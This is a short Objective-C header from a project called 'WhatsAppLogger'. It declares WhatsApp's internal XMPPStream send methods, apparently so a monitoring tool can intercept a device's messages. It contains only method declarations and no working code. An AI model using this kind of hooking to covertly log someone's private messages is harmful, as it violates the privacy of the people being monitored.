/*
 *  XMPPStream.h
 *  WhatsAppLogger
 *
 *  Created by Pichaya Srifar on 6/7/11.
 *  Copyright 2011 Vervata. All rights reserved.
 *
 */

@interface XMPPStream : NSObject {
	
}
- (NSString *) xmppUser;
-(void)send:(id)arg1;

// for WhatsApp 2.8.2 
- (void)send:(id)arg1 encrypted:(BOOL)arg2;
@end